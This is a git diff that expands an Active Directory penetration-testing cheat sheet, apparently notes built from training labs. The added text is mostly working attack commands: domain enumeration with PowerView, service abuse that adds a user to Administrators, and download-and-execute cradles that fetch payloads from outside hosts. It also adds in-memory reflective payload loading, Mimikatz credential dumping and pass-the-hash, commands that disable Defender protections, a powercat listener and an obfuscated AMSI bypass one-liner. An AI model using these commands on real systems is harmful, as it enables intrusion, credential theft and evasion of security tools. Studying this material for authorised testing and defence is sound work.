@@ -86,8 +86,111 @@ net group "Tier 0 Admins" /domain
 net accounts /domain
 ```
 
-## Enumerating using `PowerView.ps1`
+## Enumerating using `PowerView.ps1` and AD Module
+- To use AD Module we can download the DLL or PS1 script from https://github.com/samratashok/ADModule
 ```bash
+# PowerView.ps1
+Get-NetDomain
+Get-NetDomain -Domain moneycorp.local
+Get-DomainSID
+Get-DomainPolicy
+(Get-DomainPolicy)."SystemAccess" # For filteration
+(Get-DomainPolicy -Domain moneycorp.local)."SystemAccess"
+Get-NetDomainController
+Get-NetDomainController -Domain moneycorp.local 
+Get-NetUser
+Get-NetUser -Properties Name, Description
+Get-NetUser -Username <USERNAME>
+Get-NetUser -Username <USERNAME> | Select-Object SamAccountName # Or just select
+Get-UserProperty
+Get-UserProperty -Properties pwdlastset
+Get-UserProperty -Properties Name, Description
+Find-UserField -SearchField Description
+Find-UserField -SearchField Description -SearchTerm "built in"
+Get-NetComputer
+Get-NetComputer -OperatingSystem "*Server 2016*"
+Get-NetComputer -Ping
+Get-NetComputer -FullData
+Get-NetGroup
+Get-NetGroup -Domain <DOMAIN>
+Get-NetGroup -FullData
+Get-NetGroup *admin*
+Get-NetGroup -UserName <USERNAME>
+Get-NetGroupMember -GroupName "Domain Admins" -Recurse
+Get-NetLocalGroups -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups
+Get-NetLocalGroups -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
+Get-NetLoggedon
+Get-NetLoggedon -ComputerName <COMPUTER NAME>
+Get-NetLoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Get-LastLoggedon -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Invoke-ShareFinder -Verbose
+Invoke-FileFinder -Verbose
+Get-NetFileServer
+Get-NetGPO
+Get-NetGPO | select displayname
+Get-NetGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.local
+Get-NetGPOGroup
+Find-GPOComputerAdmin -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Find-GPOLocation -UserName student1 -Verbose
+Get-NetOU
+Get-NetOU -FullData
+Get-NetGPO -GPOName '<GPO FROM GPLINK OBJECT OF GET-NETOU CMDLET>'
+Get-ObjectACL -SamAccountName student1 -ResolveGUIDs
+Get-ObjectACL -ADSprefix 'CN=Administrator,CN=Users' -Verbose
+Get-ObjectACL -ADSpath "LDAP:\\CN=Domain Admins, CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
+Invoke-ACLScanner -ResolveGUIDs
+Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
+Get-NetDomainTrust
+Get-NetDomainTrust -Domain us.dollarcorp.moneycorp.local
+Get-NetForest
+Get-NetForest -Forest eurocorp.local
+Get-NetForestDomain
+Get-NetForestDomain -Forest eurocorp.local
+Get-NetForestCatalog
+Get-NetForestCatalog -Forest eurocorp.local
+Get-NetForestTrust
+Get-NetForestTrust -Forest eurocorp.local
+Find-LocalAdminAccess -Verbose # Very noisy
+Invoke-EnumerateLocalAdmin -Verbose
+Invoke-UserHunter
+Invoke-UserHunter -GroupName "RDP Users"
+Invoke-UserHunter -CheckAccess
+Invoke-UserHunter -Stealth
+
+# AD Module
+Get-ADDomain
+Get-ADDomain -Identity moneycorp.local
+(Get-ADDomain).DomainSID
+Get-ADDomainController
+Get-ADDomainController -DomainName moneycorp.local -Discover
+Get-ADUser -Identity <USERNAME> -Properties * 
+Get-ADUser -Identity <USERNAME> -Properties * | Select-Object SamAccountName  # Or just select
+Get-ADUser -Filter * -Properties *
+Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name # To show what we can get
+Get-ADUser -Filter * -Properties * | select Name. @{expression={[datetime]::FromFileTime($_.pwdlastset)}} # To show username and pwd last set
+Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name, Description
+Get-ADComputer -Filter * -Properties *
+Get-ADComputer -Filter * | select name
+Get-ADComputer -Filter * | 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name, OperatingSystem
+Get-ADComputer -Filter * -Properties DNSHostName | %{ Test-Connection -Count 1 -ComputerName $_.DNSHostName }
+Get-ADGroup -Filter * | select name
+Get-ADGroup -Filter * -Properties *
+Get-ADGroup -FIlter 'Name -like "*admin*"' | select Name
+Get-ADGroupMember -Identity "Domain Admins" -Recursive
+Get-ADPrincipalGroupMembership -Identity <USERNAME>
+Get-GPO -All
+Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html
+Get-ADOrganizationalUnit -Filter * -Properties *
+Get-GPO -Guid '<GPO FROM GPLINK OBJECT OF GET-NETOU CMDLET>'
+(GET-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access
+Get-ADTrust
+Get-ADTrust -Identity us.dollarcorp.moneycorp.local
+Get-ADFores
+Get-ADForest -Identity eurocorp.local
+(Get-ADForest).Domain
+Get-ADForest | select -ExpandProperty GlobalCatalogs
+Get-ADForest -Filter 'msDS-TrustForestTrsutInfo -ne "$null"'
+
 Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *
 Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A
 Get-ADGroup -Identity Administrators -Server za.tryhackme.com
@@ -96,6 +199,11 @@ Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com # To find acco
 Get-ADDomain -Server za.tryhackme.com
 Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
 ``` 
+- We can also use .NET Classes to enumerate if we wanted to
+```c
+$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
+$ADClass::GetCurrentDomain()
+```
 
 ## IPC Share
 - If we have IPC share with read only anonymus access we can dump information
@@ -259,6 +367,82 @@ psexec.py "DOMAIN"/"USERNAME":"PASSWORD"@"IP ADDRESS"
 GetADUsers.py -all -dc-ip "IP ADDRESS" "DOMAIN"/"USERNAME"
 ```
 
+## Privilege Escalation Methods:
+- To find we can use
+```
+Winpeas
+beroot
+Invoke-Privesc
+PowerUp.ps1
+```
+- Unquoted Service Paths can be exploited using `PowerView.ps1`
+```bash
+Invoke-ServiceAbuse -Name AbyssWebServer -Command 'net localgroup Administrators dcorp\student13 /add'
+```
+- DCSync (Exchange Windows Permissions)(Check for `Outbound Control Rights` from `BloodHound`)
+- WinLogon AutoCreds
+```bash
+reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon" # ON WINDOWS
+```
+- Stored credentials
+```bash
+cmdkey /list
+```
+
+## File Transfer Methods:
+- SMB Server
+```bash
+impacket-smbserver "SHARE NAME" $(pwd) -smb2support -user "USERNAME" -password "PASSWORD" # Starts the SMB Server
+
+# ON WINDOWS
+$pass = convertto-securestring "PASSWORD" -AsPlainText -Force # To convert it to useable password
+$cred = New-Object System.Management.Automation.PSCredential("'USERNAME'", $pass) # Setting up cred object with username and password
+New-PSDrive -Name "USERNAME" -PSProvider FileSystem -Credential $cred -Root \\"IP ADDRESS"\"SHARE NAME # Connecting the drive to windows
+cd "USERNAME": # Get into the drive
+```
+- Cert Util
+```bash
+certutil -urlcache -f http://10.50.27.84:8000/ok.exe ok.exe
+```
+- Powershell
+```bash
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.42/powerview.ps1')"
+
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.14.12.230/CLSID.ps1')|iex"
+
+powershell -c (New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
+
+Invoke-WebRequest "http://10.50.27.84:8000/PowerView.ps1" -OutFile "PowerView.ps1"
+```
+- More methods using powershell
+```bash
+# Method 1:
+iex (New-Object Net.WebClient).DownloadString('<URL>')
+
+# Method 2:
+$ie = New-Object -ComObject InternetExplorer.Application
+$ie.visible=$False
+$ie.navigatate('<URL>')
+sleep 5
+$response=$ie.Document.Body.innerHTML
+$ie.quit()
+iex $response
+
+# Method 3:
+iex (iwr '<URL>')
+
+# Method 4:
+$h = New-Object -ComObject Msxm12.XMLHTTP
+$h =.open('GET', '<URL>', $false)
+$h.send()
+iex $h.responseText
+
+# Method 5:
+$wr = [System.NET.webRequest]::Create('<URL>')
+$r = $wr.GetResponse()
+IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+```
+
 ## Kerbrute:
 - We can check if the user exist on domain controller using
 ```bash
@@ -270,6 +454,8 @@ https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
 - If we have a account username and password we can kerberoast using it
 ```bash
 GetUserSPNs.py "DOMAIN"/"USERNAME":"PASSWORD" -request -outputfile hash
+
+GetUserSPNs.py -dc-ip "DC IP" "DOMAIN"/"USERNAME":"PASSWORD" -request -outputfile hash
 ```
 - We can then crack it using hashcat
 ```bash
@@ -309,6 +495,42 @@ evil-winrm -u "USERNAME" -p "PASSWORD" -i "IP ADDRESS"
 
 ## Powershell Remoting
 - We can use powershell remoting to do lateral movement
+- We can use interactive session with
+```bash
+$sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
+Enter-PSSession $sess
+```
+- We can use non interactive session with
+```bash
+Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock{whoami;hostname}
+```
+- If we want to run it against all the servers in a machine which is very helpful
+```bash
+Invoke-Command -ScriptBlock{Get-Process} -ComputerName (Get-Content list.txt)
+```
+- We can also use it for pass the hash attacks
+```bash
+Invoke-Command -FilePath C:\scripts\Get-PassHash.ps1 -ComputerName (Get-Content list.txt)
+```
+- We can also use this to pass locally loaded function over but it may not work if the target has appropriate protections in place
+```bash
+Invoke-Command -ScriptBlock${function:Invoke-Privesc} -ComputerName (Get-Content list.txt)
+# OR To check arguments
+Invoke-Command -ScriptBlock${function:Invoke-Privesc} -ComputerName (Get-Content list.txt) -ArgumentList
+```
+- In interactive sessions, we can also use this using
+```bash
+$sess = New-PSSesion -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
+Invoke-Command -FilePath C:\scripts\hello.ps1 -Session $sess
+# Then when we log into the session interactively we can use that function
+Enter-PSSession -ComputerName $sess
+```
+```bash
+$sess = New-PSSesion -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
+Invoke-Command -Session $sess -ScriptBlock{$proc = Get-Process}
+Invoke-Command -Session $sess -ScriptBlock{$proc.name}
+```
+- In case of having credentials we can do
 ```bash
 $username = 'serverAdmin'
 $password = 'EZpass4ever'
@@ -336,40 +558,13 @@ MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RE
 - bloodhound
 - kerberoast
 - GetADUsers.py
+- ASREP Roast
 
-## Privilege Escalation Methods:
-- Winpeas.exe (To find)
-- Unquoted Service Paths
-- DCSync (Exchange Windows Permissions)(Check for `Outbound Control Rights` from `BloodHound`)
-- WinLogon AutoCreds
+## Powercat:
+- Netcat for powershell
 ```bash
-reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon" # ON WINDOWS
-```
-
-## File Transfer Methods:
-- SMB Server
-```bash
-impacket-smbserver "SHARE NAME" $(pwd) -smb2support -user "USERNAME" -password "PASSWORD" # Starts the SMB Server
-
-# ON WINDOWS
-$pass = convertto-securestring "PASSWORD" -AsPlainText -Force # To convert it to useable password
-$cred = New-Object System.Management.Automation.PSCredential("'USERNAME'", $pass) # Setting up cred object with username and password
-New-PSDrive -Name "USERNAME" -PSProvider FileSystem -Credential $cred -Root \\"IP ADDRESS"\"SHARE NAME # Connecting the drive to windows
-cd "USERNAME": # Get into the drive
-```
-- Cert Util
-```bash
-certutil -urlcache -f http://10.17.4.195/mimikatz-32.exe mimikatz.exe
-```
-- Powershell
-```bash
-powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.15.75/SharpHound.ps1')"
-
-powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.14.12.230/CLSID.ps1')|iex"
-
-powershell -c (New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
-
-Invoke-WebRequest "http://10.14.12.230/CLSID.ps1" -OutFile "CLSID.ps1"
+. .\powercat.ps1
+powercat -l -v -p 443 -t 1000
 ```
 
 ## Bloodhound:
@@ -384,6 +579,12 @@ bloodhound --no-sandbox # Start bloodhound with the password you set earlier
 - If didnt work you can use `bloodhound-python` injestors instead
 ```bash
 bloodhound-python -c all --domain htb.local -u svc-alfresco -p s3rvice -ns 10.129.149.232 -v
+```
+- Can also use powershell scripts
+```bash
+Import-Module .\Sharphound.ps1    
+
+Invoke-Bloodhound -CollectionMethod All -Domain THROWBACK.local -ZipFileName loot.zip
 ```
 - You can change things in `SharpHound` to make more stealthy
 - We can use pathfinding to find our path to the desired node from owned node
@@ -485,13 +686,19 @@ namespace SharpSploitWhoAmI
 - In `Costura` method, Write the code first then on the Reference section in Visual Studio add reference of the `SharpSploit.dll` and then compile
 - We can also use `SharpGen` to generate a binary
 
-## Reflection Method from URL:
+## Reflection Method:
 - Can use this to load a payload from url using reflection method without touching disk
 - Need to defeat AMSI before
 ```c
 $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/payload.exe')
 $assem = [System.Reflection.Assembly]::Load($data)
 [TotallyNotMal.Program]::Main()
+```
+- To work with a DLL on disk
+```bash
+[System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes(".\amsibypass.dll"))
+[Bypass.Asmi] # Bypass is a namespace. Amsi is a class in that namespace.
+[Bypass.Asmi]::Patch() # Patch is a function in the Amsi class in the Bypass namespace.
 ```
 
 ## WinPEAS:
@@ -543,7 +750,12 @@ sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03a
 # Golden Ticket
 lsadump::dcsync /user:za\krbtgt
 ```
-
+- We can also use `Invoke-Mimikatz.ps1` for the same purposes
+```bash
+Invoke-Mimikatz -DumpCreds
+Invoke-Mimikatz -DumpCreds -ComputerName @("sys1", "sys2")
+Invoke-Mimikatz -Command "sekurlsa::pth /user:Administrator /domain dollarcorp.moneycorp.local /ntlm:<HASH> /run:powershell.exe" # Over pass the hash attack
+```
 ## DACLs/ACLs:
 `acl-pwn`
 - Resource = https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse
@@ -648,6 +860,11 @@ Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
 wmic.exe /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get *
 ```
 
+## Windows Defender Exclusions:
+```bash
+reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s
+```
+
 ## Persistence Mechanisms:
 - C2
 - COM Persistence
@@ -662,7 +879,28 @@ wmic.exe /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get *
 ## Initial Access:
 - VBA Stomping/Purging
 
+## Constrained Language Mode
+- We can see of the language mode is constrained using
+```bash
+$ExecutionContext.SessionState.LanguageMode
+```
+
+## Defender:
+- We can make the download functionality defender less
+```bash
+ Set-MpPreference -DisableIOAVProtection $true
+```
+- We can turn Real Time Protection off
+```bash
+
+```
+
 ## AMSI Bypass
+- Can use this bypass
+```bash
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+- Other bypasses: 
 - `amsi.fail`
 - `https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell`
 - `https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/`
